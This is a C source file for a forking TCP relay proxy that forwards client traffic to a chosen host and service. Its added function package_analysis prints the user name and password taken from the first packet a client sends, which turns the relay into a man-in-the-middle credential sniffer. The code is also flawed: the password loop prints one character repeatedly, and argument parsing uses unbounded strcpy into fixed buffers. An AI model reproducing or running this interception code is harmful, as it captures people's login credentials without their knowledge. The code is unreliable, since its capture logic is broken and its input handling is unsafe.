#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/wait.h>
#define TCP_PROTO "tcp"
int proxy_port;
struct sockaddr_in hostaddr;
extern int errno;

void parse_args (int argc, char **argv);
void daemonize (int servfd);
void do_proxy (int usersockfd);
void reap_status (void);
void errorout (char *msg);
void package_analysis(char* buf,int package_length);
main (int argc,char* argv[])
{
   int clilen;
	 int childpid;
	 int sockfd, newsockfd;
	 struct sockaddr_in servaddr, cliaddr;
	 parse_args(argc,argv);
	      
	 bzero((char *) &servaddr, sizeof(servaddr));
	 servaddr.sin_family = AF_INET;
	 servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
         servaddr.sin_port = proxy_port;
		  
         if ((sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0) {
		fputs("failed to create server socket",stderr);
	        exit(1);
	 }
		   
	 if (bind(sockfd,(struct sockaddr *) (&servaddr),sizeof(servaddr)) < 0) { 
	        fputs("faild to bind server socket to specified port",stderr);
	        exit(1);
	 }
		    
         listen(sockfd,5);
		     
//         daemonize(sockfd);
		      
          while (1) {
		clilen = sizeof(struct sockaddr_in);
	        newsockfd = accept(sockfd, (struct sockaddr *) (&cliaddr), &clilen);  
		if (newsockfd < 0 && errno == EINTR)
			 continue;
			else if (newsockfd < 0)
			        errorout("failed to accept connection");
				        if ((childpid = fork()) == 0) {
						   close(sockfd);
						   do_proxy(newsockfd);
						   exit(0);
					 }
		close(newsockfd);
	 }
}

void parse_args (argc,argv)
	int argc;
	char **argv;
{
	 int i;
	 struct hostent *hostp;
	 struct servent *servp;
	 unsigned long inaddr;
	 struct {
		      char proxy_port [16];
		      char isolated_host [64];
		      char service_name [32];
	 } pargs;

	 if (argc < 4) {
		 printf("usage: %s ",argv[0]);
	         exit(1);
	 }
	 strcpy(pargs.proxy_port,argv[1]);
	 strcpy(pargs.isolated_host,argv[2]);
         strcpy(pargs.service_name,argv[3]);
         for (i = 0; i < strlen(pargs.proxy_port); i++)
	       if (!isdigit(*(pargs.proxy_port + i)))
		       break;
	 if (i == strlen(pargs.proxy_port))
	         proxy_port = htons(atoi(pargs.proxy_port));
		 else {
			  printf("%s: invalid proxy port",pargs.proxy_port);
			  exit(0);
		 }
         bzero(&hostaddr,sizeof(hostaddr));
         hostaddr.sin_family = AF_INET;
         if ((inaddr = inet_addr(pargs.isolated_host)) != INADDR_NONE)
                 bcopy(&inaddr,&hostaddr.sin_addr,sizeof(inaddr));
		 else if ((hostp = gethostbyname(pargs.isolated_host)) != NULL)
				  bcopy(hostp->h_addr,&hostaddr.sin_addr,hostp->h_length);
			 else {
				   printf("%s: unknown host",pargs.isolated_host);
				   exit(1);
		         }

	 if ((servp = getservbyname(pargs.service_name,TCP_PROTO)) != NULL)
		    hostaddr.sin_port = servp->s_port;
		else if (atoi(pargs.service_name) > 0)
		          hostaddr.sin_port = htons(atoi(pargs.service_name));
			  else {
				    printf("%s: invalid/unknown service name or port number",pargs.service_name);
				    exit(1);
			 }
}

void daemonize (servfd)
	int servfd;
{
	int childpid, fd, fdtablesize;
	  
	signal(SIGTTOU,SIG_IGN);
	signal(SIGTTIN,SIG_IGN);
	signal(SIGTSTP,SIG_IGN);
	     
	if ((childpid = fork()) < 0) {
		 fputs("failed to fork first child",stderr);
		 exit(1);
	}
	    else if (childpid > 0)
		  exit(0);
	       
	if (setpgrp(0,getpid()) < 0) {
		fputs("failed to become process group leader",stderr);
	        exit(1);
	}
	        
	if ((fd = open("/dev/tty",O_RDWR)) >= 0) {
	        ioctl(fd,TIOCNOTTY,NULL);
	        close(fd);
	}
		 
        for (fd = 0, fdtablesize = getdtablesize(); fd < fdtablesize; fd++)
	        if (fd != servfd)
		     close(fd);
		  
	chdir("/");
		   
	umask(0);
		    
        signal(SIGCLD,reap_status);
}

void do_proxy (int usersockfd)
{
	 int isosockfd;
	 fd_set rdfdset;
	 int connstat;
	 int iolen;
	 char buf [2048];
	      
	 if ((isosockfd = socket(AF_INET,SOCK_STREAM,0)) < 0)
		 errorout("failed to create socket to host");
	       
	 connstat = connect(isosockfd,(struct sockaddr *) &hostaddr,sizeof(hostaddr));
	 switch (connstat) {
			  case 0:
				   break;
		          case ETIMEDOUT:
			  case ECONNREFUSED:
			  case ENETUNREACH:
				   strcpy(buf,sys_errlist[errno]);
				   strcat(buf,"");
			           write(usersockfd,buf,strlen(buf));
			           close(usersockfd);
				   exit(1);
				   break;
			  default:
				   errorout("failed to connect to host");
        }

		 
        while (1) {
			  
			FD_ZERO(&rdfdset);
			FD_SET(usersockfd,&rdfdset);
			FD_SET(isosockfd,&rdfdset);
			if (select(FD_SETSIZE,&rdfdset,NULL,NULL,NULL) < 0)
					    errorout("select failed");
				   
			if (FD_ISSET(usersockfd,&rdfdset)) {
				if ((iolen = read(usersockfd,buf,sizeof(buf))) <= 0)
				           break;
				           package_analysis(buf,iolen);
					   write(isosockfd,buf,iolen);
				}
				     
			if (FD_ISSET(isosockfd,&rdfdset)) {
				if ((iolen = read(isosockfd,buf,sizeof(buf))) <= 0)
					   break;
				           write(usersockfd,buf,iolen);
			}
       }
		  
       close(isosockfd);
       close(usersockfd);
}


void errorout (msg)
	char *msg;
{
	 FILE *console;
	 console = fopen("/dev/console","a");
	 fprintf(console,"proxyd: %s",msg);
	 fclose(console);
	 exit(1);
}
void reap_status ()
{
	 int pid;
	 union wait status;
	 while ((pid = wait3(&status,WNOHANG,NULL)) > 0);
}

void package_analysis(char* buf, int package_length){
	static int num=0;
	char* start=buf;
	if(num++==0){
	    start=buf+36;
	    printf("The user is: ");
	    while(*start!='\0'){
                  printf("%c",*start++);
	    }
	    printf("\n");
	    if(*start=='\0'){
		    ++start;
		    int i=0;
		    printf("Password:");
		    while(i++<20)
			    printf("%c",*start);
		    printf("\n");
	    }
	}
}

